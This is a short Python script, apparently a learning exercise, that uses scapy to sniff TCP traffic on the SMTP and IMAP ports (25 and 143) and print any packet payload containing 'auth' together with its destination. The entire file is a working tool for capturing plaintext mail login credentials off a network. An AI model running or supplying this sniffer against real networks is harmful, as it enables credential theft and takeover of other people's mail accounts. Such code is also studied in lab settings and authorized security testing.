from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    print(str(packet))
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'auth' in mypacket.lower():
            print(f'[*] Destination: {packet[IP].dst}')
            print(f'[*] {str(packet[TCP].payload)}')

def main():
    sniff(filter='tcp port 25 or tcp port 143', prn=packet_callback, store = 0)
    #sniff(filter='tcp and (port 465)', prn=packet_callback, store = 0)

if __name__=="__main__":
    main()